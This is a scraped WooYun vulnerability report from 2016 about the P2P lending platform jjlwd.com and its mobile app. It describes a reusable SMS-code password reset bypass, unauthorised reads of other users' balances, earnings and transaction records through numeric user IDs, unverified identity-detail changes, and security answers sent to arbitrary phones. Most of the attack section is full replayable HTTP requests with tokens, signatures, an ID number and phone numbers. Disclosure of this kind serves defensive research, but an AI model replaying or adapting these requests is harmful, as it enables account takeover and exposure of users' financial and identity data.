{"id": 85785, "wybug_id": "wooyun-2016-0187123", "wybug_title": "P2P金融安全之京金联某处密码重置等多个设计缺陷", "wybug_corp": "jjlwd.com", "wybug_author": "路人甲", "wybug_date": "2016-03-20 23:22", "wybug_open_date": "2016-03-25 23:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 打包了 详细说明：  http://android.myapp.com/myapp/detail.htm?apkName=com.jjl 更新时间：2016.3.17 版本1.0.2下载安装APP1.密码重置先利用注册功能，给自己手机发送验证码\n\n记下接口返回体内容，跟手机验证码例如\n\nrandomCode：kGAMCEZ0UFw= 对应验证码：784204重置13333333333，发送验证码并输入信息后提交，获得一个接口\n\n利用以上俩个信息，拼接该接口\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 155Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAAFLlt1sUHwgAzuXkesMh7BsNROmwUser-Agent: okhttp/2.1.0sign=E2BFDCBE3EC3B2E291576EF46BFD9D29&verification_code=我们的验证码&functionType=4&phone_key=l1I%2FC01zZlj6GOhTk5KWcQ%3D%3D&auth=jjlwd&info=2015&sms_key=我们的randomCode&new_passwd=123123&mobile=13333333333\n提交结果\n\n修改成功\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 199Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAALMzDlBkpQsAlA+I3VOca5JqHm2NUser-Agent: okhttp/2.1.0sign=E2BFDCBE3EC3B2E291576EF46BFD9D29&verification_code=784204&functionType=4&phone_key=l1I%2FC01zZlj6GOhTk5KWcQ%3D%3D&auth=jjlwd&info=2015&sms_key=kGAMCEZ0UFw%3D&new_passwd=123123&mobile=13333333333\n可保存该接口，以便下次利用，就无需发送验证码（ps：审核可直接复制该接口内容进行密码重置）2.信息泄露登陆（token是没有用地，会话是没有地，uid是数字地，越权走一波）查询账号资金信息接口，可越权查看账户资金（可发现土豪账户）\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 118Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAALMzDlBkpQsAlA+I3VOca5JqHm2NUser-Agent: okhttp/2.1.0userID=11888&functionType=40&auth=jjlwd&info=2015&sign=E2BFDCBE3EC3B2E291576EF46BFD9D29&token=ECB1F97F4D805FE25e67ff2d\n\n\n查询历史收益接口，可越权\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 145Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAALMzDlBkpQsAlA+I3VOca5JqHm2NUser-Agent: okhttp/2.1.0userID=11888&functionType=10&auth=jjlwd&info=2015&sign=E2BFDCBE3EC3B2E291576EF46BFD9D29&token=ECB1F97F4D805FE25e67ff2d&page_count=10&page_index=1\n\n\n\n\n查询收支明细记录，可越权\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 213Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAALMzDlBkpQsAlA+I3VOca5JqHm2NUser-Agent: okhttp/2.1.0functionType=41&userID=11888&token=ECB1F97F4D805FE25e67ff2d&page_index=1&page_count=1000&startTime=2016-03-01+00%3A00%3A00&endTime=2016-03-31+23%3A59%3A59&auth=jjlwd&info=2015&sign=E2BFDCBE3EC3B2E291576EF46BFD9D29\n\n\n3.个人资料修改APP还有个功能个人资料表更\n\n未验证之前的姓名和身份证，仅通过验证码正确与否来确定是否修改个人资料，然后通过跟重置密码一样的手段，可直接绕过验证码，更换个人资料.例如修改的接口\nPOST http://www.jjlwd.com/mobile/appService.do HTTP/1.1Content-Type: application/x-www-form-urlencoded; charset=UTF-8Content-Length: 262Host: www.jjlwd.comConnection: Keep-AliveAccept-Encoding: gzipCookie: aliyungf_tc=AQAAACQyGS1J7AwAlQ+I3bDjJoCyaq8VUser-Agent: okhttp/2.1.0sms_key=kGAMCEZ0UFw%3D&verification_code=784204&realName=%E4%BB%80%E4%B9%88%E9%AC%BC&userID=11888&functionType=13&key=l1I%2FC01zZlj6GOhTk5KWcQ%3D%3D&auth=jjlwd&idNo=513228198401237858&info=2015&sign=E2BFDCBE3EC3B2E291576EF46BFD9D29&token=ECB1F97F4D805FE25e67ff2d\n同样换掉验证码跟randCOde即可\n\n在登陆时，服务器会返回用户的身份证号跟姓名修改前：\n\n修改后：\n\n还有个重磅消息，这接口同样是有个uid的，同样存在越权操作，so，如果一放进burp跑一波，炸了（不敢试）4.官网获取密保答案，可修改密保答案再说个官网的缺陷官网登陆\n\n忘记密保问题的答案这一功能，可将答案发送给任意手机号\n\n点击【忘记密保？发送到手机】后抓包，修改手机号\n\n查看自己的手机短信，\n\n输入问题答案即可，通过密保问题。\n\n   漏洞证明：  如上   修复方案：  加强验证，修复越权。验证码不返回。验证码跟手机号绑定。账户跟手机号绑定。必须给个20R对不   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-03-25 23:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}